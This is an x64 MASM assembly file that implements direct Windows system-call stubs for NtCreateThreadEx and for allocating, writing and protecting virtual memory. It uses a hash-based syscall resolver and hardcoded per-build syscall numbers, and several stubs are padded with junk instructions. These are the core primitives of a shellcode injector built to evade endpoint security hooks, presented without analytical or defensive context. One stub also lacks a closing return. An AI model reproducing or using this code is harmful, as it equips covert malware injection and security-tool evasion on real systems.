.code
EXTERN SW3_GetSyscallNumber: PROC

bye :
ret

NtCreateThreadEx PROC
	mov [rsp +8], rcx          ; Save registers.
	mov [rsp+16], rdx
	mov [rsp+24], r8
	mov [rsp+32], r9
	sub rsp, 28h
	mov ecx, 03EA48B99h        ; Load function hash into ECX.
	call SW3_GetSyscallNumber              ; Resolve function hash into syscall number.
	add rsp, 28h
	mov rcx, [rsp+8]                      ; Restore registers.
	mov rdx, [rsp+16]
	mov r8, [rsp+24]
	mov r9, [rsp+32]
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
NtCreateThreadEx ENDP

		ANtCTE proc
			mov r12, rcx
			mov r13, rdx
			mov r14, r8
			mov r15, r9

			mov r10, rcx
			xor rax, rax
				add eax, 0C1h		; 2004, 20H2
			syscall
			cmp rax, 00
			je bye

			mov rcx, r12
			mov rdx, r13
			mov r8, r14
			mov r9, r15

			mov r10, rcx
			xor rax, rax
				add eax, 0BDh		; 1903, 1909
			syscall
			cmp rax, 00
			je bye

			mov rcx, r12
			mov rdx, r13
			mov r8, r14
			mov r9, r15

			mov r10, rcx
			xor rax, rax
				add eax, 0BCh		; 1809
			syscall
			cmp rax, 00
			je bye
		ANtCTE endp
		


BNtAVM proc
mov r8, r10
mov r10, 01h
xor r10, r10
mov r10, 0Ah
mov r10, rcx
xor eax, eax
sub r8, r10
add eax, 18h; 1507 +
xor r8, r8
syscall
ret
BNtAVM endp


BNtWVM proc
add rcx, 0Ah
xor eax, eax
mov r10, rcx
add eax, 3Ah; 1507 +
sub r10, 0Ah
sub rcx, 0Ah
syscall
ret
BNtWVM endp


BNtPVM proc
add r10, 1Ch
xor eax, eax
mov r10, rcx
sub r10, 01h
add eax, 50h; 1507 +
add r10, 01h
syscall
ret
BNtPVM endp


end